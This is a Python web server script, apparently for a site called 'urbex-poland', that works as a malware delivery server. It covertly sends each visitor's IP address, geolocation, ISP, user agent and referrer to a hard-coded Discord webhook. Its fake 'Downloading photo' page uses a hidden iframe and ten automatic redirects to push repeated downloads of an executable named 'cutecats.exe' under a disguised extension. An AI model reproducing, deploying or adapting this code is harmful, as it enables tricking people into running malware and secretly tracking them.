import http.server
import socketserver
import webbrowser
import os
import sys
import urllib.parse
import urllib.request
import json
import threading
import time

PORT = 8000
DIRECTORY = os.path.dirname(os.path.abspath(__file__))
# PAYLOAD_CONFIG_START
PAYLOAD_REL_PATH = "media/downloads/cutecats.exe.d"
PAYLOAD_BASENAME = "cutecats.exe"
PAYLOAD_EXT = "d"
# PAYLOAD_CONFIG_END
TOX_ID = PAYLOAD_BASENAME
TOX_IMAGE_PATH = os.path.join(DIRECTORY, "media", "images", "tox.png")
TOX_ID_IMAGE_PATH = os.path.join(DIRECTORY, PAYLOAD_REL_PATH)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1552406859527233602/n6RGGVyXRd7pYPc6rIfgiVmbNpRSlfufL0IwAMYpE9QDmsgA0nB1om1ZEkumUft7Fm42"

LOGGED_IPS = {}
LOG_LOCK = threading.Lock()

def send_discord_server_log(ip, path, user_agent, referrer):
    now = time.time()
    with LOG_LOCK:
        if ip in LOGGED_IPS and now - LOGGED_IPS[ip] < 60:
            return
        LOGGED_IPS[ip] = now

    location_str = "Unknown"
    org_str = "Unknown"
    if ip not in ("127.0.0.1", "::1", "localhost") and not ip.startswith("192.168.") and not ip.startswith("10.") and not ip.startswith("172."):
        try:
            req = urllib.request.Request(f"https://ipapi.co/{ip}/json/", headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=4) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                loc_parts = [data.get(k) for k in ("city", "region", "country_name") if data.get(k)]
                if loc_parts:
                    location_str = ", ".join(loc_parts)
                org_str = data.get("org") or data.get("asn") or "Unknown"
        except Exception:
            pass

    payload = {
        "username": "Visitor Logger (Server)",
        "embeds": [{
            "title": "🚨 Server Visitor Detected",
            "color": 15682628,
            "fields": [
                {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
                {"name": "📍 Location", "value": location_str, "inline": True},
                {"name": "🏢 Organization / ISP", "value": org_str, "inline": False},
                {"name": "🔗 Path Visited", "value": path, "inline": False},
                {"name": "🧭 Referrer", "value": referrer or "Direct / None", "inline": True},
                {"name": "📱 User Agent", "value": f"```{user_agent[:400]}```" if user_agent else "Unknown", "inline": False}
            ],
            "footer": {"text": "urbex-poland • Server Logger"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        }]
    }

    try:
        req = urllib.request.Request(
            DISCORD_WEBHOOK_URL,
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass

DOWNLOAD_PAGE_TEMPLATE = """<!doctype html>
<html>
<head>
  <title>🌶️ - Downloading...</title>
  <meta charset="UTF-8">
  <style>
    html, body {{
      width: 100%;
      height: 100%;
      margin: 0;
      background: #000;
      color: #fff;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      overflow: hidden;
    }}
    .box {{
      border: 3px solid #fff;
      padding: 35px 30px;
      border-radius: 12px;
      box-shadow: 0 0 35px rgba(255,255,255,0.25);
      background: #080808;
      max-width: min(90vw, 600px);
      box-sizing: border-box;
    }}
    .spinning-image-container {{
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 10px auto 20px auto;
    }}
    .spinning-image {{
      width: clamp(140px, 30vw, 220px);
      height: auto;
      animation: spin 3s linear infinite;
      filter: drop-shadow(0 0 25px rgba(168, 85, 247, 0.75));
      user-select: none;
      pointer-events: none;
    }}
    @keyframes spin {{
      from {{ transform: rotate(0deg); }}
      to {{ transform: rotate(360deg); }}
    }}
    .status {{
      font-size: 1.3rem;
      color: #38bdf8;
      font-weight: bold;
      margin-bottom: 10px;
    }}
    .sub {{
      font-size: 1rem;
      color: #888;
    }}
  </style>
</head>
<body>
  <div class="box">
    <div class="spinning-image-container">
      <img src="/media/images/chili.png" alt="Spinning Pepper" class="spinning-image">
    </div>
    <div class="status">Downloading photo ({cycle} / 10)...</div>
    <div class="sub">Rerouting back to main...</div>
  </div>

  <iframe src="/get-tox-image?n={cycle}" style="display:none"></iframe>

  <script src="/logger.js"></script>
  <script>
    const cycle = {cycle};
    const nextCycle = cycle + 1;
    const nextUrl = nextCycle <= 10 ? '/?cycle=' + nextCycle : '/?done=1';
    setTimeout(() => {{
      window.location.replace(nextUrl);
    }}, 700);
  </script>
</body>
</html>
"""

class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIRECTORY, **kwargs)

    def end_headers(self):
        # Disable browser caching so updates are instantaneous
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.send_header("Expires", "0")
        super().end_headers()

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)

        # Log visitor on main page visits (async in background)
        if path in ("/", "/index.html", "/download", "/download-tox"):
            client_ip = (
                self.headers.get("CF-Connecting-IP")
                or (self.headers.get("X-Forwarded-For", "").split(",")[0].strip())
                or (self.headers.get("X-Real-IP"))
                or self.client_address[0]
            )
            if client_ip:
                threading.Thread(
                    target=send_discord_server_log,
                    args=(client_ip, path, self.headers.get("User-Agent", ""), self.headers.get("Referer", "")),
                    daemon=True
                ).start()

        # Raw binary file download endpoint
        if path in ("/get-tox-image", "/download-file") or (path in ("/download", "/api/download") and ("raw" in query or "file" in query)):
            target_image = TOX_ID_IMAGE_PATH if os.path.exists(TOX_ID_IMAGE_PATH) else TOX_IMAGE_PATH
            if os.path.exists(target_image):
                with open(target_image, "rb") as f:
                    content = f.read()
                
                num = query.get("n", query.get("cycle", [""]))[0]
                ext_dot = f".{PAYLOAD_EXT}" if PAYLOAD_EXT else ""
                filename = f"{PAYLOAD_BASENAME}_{num}{ext_dot}" if (num and num != "1") else f"{PAYLOAD_BASENAME}{ext_dot}"

                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Disposition", f'attachment; filename="{filename}"')
                self.send_header("Content-Length", str(len(content)))
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(content)
                return
            else:
                self.send_error(404, "Tox image not found")
                return

        # Reroute download page
        if path in ("/download", "/download-tox"):
            try:
                cycle = int(query.get("cycle", query.get("n", ["1"]))[0])
            except (ValueError, IndexError):
                cycle = 1

            html = DOWNLOAD_PAGE_TEMPLATE.format(cycle=cycle, tox_id=TOX_ID).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(html)))
            self.end_headers()
            self.wfile.write(html)
            return

        super().do_GET()

def run():
    port = PORT
    while port < PORT + 50:
        try:
            with socketserver.TCPServer(("", port), Handler) as httpd:
                url = f"http://localhost:{port}/"
                print(f"[*] Serving urbex-poland at {url}")
                print("[*] Press Ctrl+C to stop the server.")
                
                if "--no-browser" not in sys.argv:
                    webbrowser.open(url)
                    
                httpd.serve_forever()
        except OSError as e:
            if "address already in use" in str(e).lower() or e.errno in (48, 98, 10048):
                port += 1
                continue
            raise

if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
